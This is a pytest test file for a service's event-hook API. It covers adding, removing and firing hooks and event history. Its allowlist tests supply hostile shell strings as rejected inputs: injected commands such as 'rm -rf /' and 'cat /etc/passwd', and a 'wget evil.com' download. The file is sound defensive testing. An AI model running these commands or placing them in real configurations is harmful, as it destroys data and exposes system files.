"""Tests for routers/event_router.py — Event handler endpoints."""

from __future__ import annotations

from unittest.mock import AsyncMock, patch

import pytest

from dawos_agent.services import event_handler


@pytest.fixture(autouse=True)
def _clean_hooks():
    """Reset in-memory stores before each test."""
    event_handler._hooks.clear()
    event_handler._event_log.clear()
    yield
    event_handler._hooks.clear()
    event_handler._event_log.clear()


# ---------------------------------------------------------------------------
# GET /events/hooks
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_list_hooks(client, headers):
    resp = await client.get("/api/v1/events/hooks", headers=headers)
    assert resp.status_code == 200
    assert resp.json()["count"] == 0


@pytest.mark.asyncio
async def test_list_hooks_no_auth(client):
    resp = await client.get("/api/v1/events/hooks")
    assert resp.status_code == 401


# ---------------------------------------------------------------------------
# POST /events/hooks
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_add_hook(client, headers):
    resp = await client.post(
        "/api/v1/events/hooks",
        headers=headers,
        json={
            "name": "test-hook",
            "event": "session-up",
            "action": "https://example.com/hook",
            "enabled": True,
        },
    )
    assert resp.status_code == 201
    assert resp.json()["name"] == "test-hook"


@pytest.mark.asyncio
async def test_add_hook_duplicate(client, headers):
    event_handler.add_hook("dup", "session-up", "https://example.com/dup")
    resp = await client.post(
        "/api/v1/events/hooks",
        headers=headers,
        json={
            "name": "dup",
            "event": "session-down",
            "action": "https://example.com/dup2",
        },
    )
    assert resp.status_code == 409


@pytest.mark.asyncio
async def test_add_hook_invalid_event(client, headers):
    resp = await client.post(
        "/api/v1/events/hooks",
        headers=headers,
        json={"name": "bad", "event": "bogus", "action": "https://example.com/hook"},
    )
    assert resp.status_code == 409


# ---------------------------------------------------------------------------
# DELETE /events/hooks/{name}
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_remove_hook(client, headers):
    event_handler.add_hook("rm1", "session-up", "cmd")
    resp = await client.delete("/api/v1/events/hooks/rm1", headers=headers)
    assert resp.status_code == 204


@pytest.mark.asyncio
async def test_remove_hook_not_found(client, headers):
    resp = await client.delete("/api/v1/events/hooks/nope", headers=headers)
    assert resp.status_code == 404


# ---------------------------------------------------------------------------
# POST /events/fire
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_fire_event(client, headers):
    event_handler.add_hook("wh1", "session-up", "https://example.com/hook")
    resp = await client.post(
        "/api/v1/events/fire",
        headers=headers,
        json={"event": "session-up", "payload": {"user": "test"}},
    )
    assert resp.status_code == 200
    assert resp.json()["hooks_fired"] == 1


@pytest.mark.asyncio
async def test_fire_event_invalid(client, headers):
    resp = await client.post(
        "/api/v1/events/fire",
        headers=headers,
        json={"event": "bogus-event", "payload": {}},
    )
    assert resp.status_code == 400


@pytest.mark.asyncio
async def test_fire_event_generic_error(client, headers):
    with patch(
        "dawos_agent.routers.event_router.event_handler.fire_event",
        new_callable=AsyncMock,
        side_effect=RuntimeError("unexpected"),
    ):
        resp = await client.post(
            "/api/v1/events/fire",
            headers=headers,
            json={"event": "session-up", "payload": {}},
        )
    assert resp.status_code == 500


# ---------------------------------------------------------------------------
# GET /events/history
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_event_history(client, headers):
    event_handler._event_log.append({"event": "session-up", "hooks_fired": 0})
    resp = await client.get("/api/v1/events/history", headers=headers)
    assert resp.status_code == 200
    assert resp.json()["count"] == 1


# ---------------------------------------------------------------------------
# DELETE /events/history
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_clear_history(client, headers):
    event_handler._event_log.extend([{"a": 1}, {"b": 2}])
    resp = await client.delete("/api/v1/events/history", headers=headers)
    assert resp.status_code == 204


@pytest.mark.asyncio
async def test_clear_history_empty(client, headers):
    resp = await client.delete("/api/v1/events/history", headers=headers)
    assert resp.status_code == 204


# ---------------------------------------------------------------------------
# Action allowlist validation (QA-160726 / DAWOS-02)
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_add_hook_rejects_shell_metachar(client, headers):
    """Actions with shell metacharacters must be rejected (422)."""
    for evil in [
        "accel-cmd show stat; rm -rf /",
        "accel-cmd show stat | cat /etc/passwd",
        "accel-cmd show stat && echo pwned",
        "accel-cmd show stat `whoami`",
        "accel-cmd show stat $(id)",
    ]:
        resp = await client.post(
            "/api/v1/events/hooks",
            headers=headers,
            json={"name": "evil", "event": "session-up", "action": evil},
        )
        assert resp.status_code == 422, f"Expected 422 for: {evil}"


@pytest.mark.asyncio
async def test_add_hook_rejects_non_allowlisted_command(client, headers):
    """Non-allowlisted shell commands must be rejected (422)."""
    for cmd in ["echo hello", "rm -rf /", "wget evil.com", "/bin/sh -c bad"]:
        resp = await client.post(
            "/api/v1/events/hooks",
            headers=headers,
            json={"name": "bad", "event": "session-up", "action": cmd},
        )
        assert resp.status_code == 422, f"Expected 422 for: {cmd}"


@pytest.mark.asyncio
async def test_add_hook_accepts_webhook_urls(client, headers):
    """Webhook URLs (http/https) must always be accepted."""
    urls = [
        "https://example.com/hook",
        "http://192.168.1.10:8080/callback",
        "https://hooks.slack.com/services/T00/B00/xxx",
    ]
    for i, url in enumerate(urls):
        resp = await client.post(
            "/api/v1/events/hooks",
            headers=headers,
            json={
                "name": f"wh-{i}",
                "event": "session-up",
                "action": url,
            },
        )
        assert resp.status_code == 201, f"Expected 201 for: {url}"


@pytest.mark.asyncio
async def test_add_hook_accepts_allowlisted_commands(client, headers):
    """Allowlisted command prefixes must be accepted."""
    safe = [
        "accel-cmd show stat",
        "uptime",
        "nft list ruleset",
        "ss -tunlp",
    ]
    for i, cmd in enumerate(safe):
        resp = await client.post(
            "/api/v1/events/hooks",
            headers=headers,
            json={
                "name": f"safe-{i}",
                "event": "session-down",
                "action": cmd,
            },
        )
        assert resp.status_code == 201, f"Expected 201 for: {cmd}"
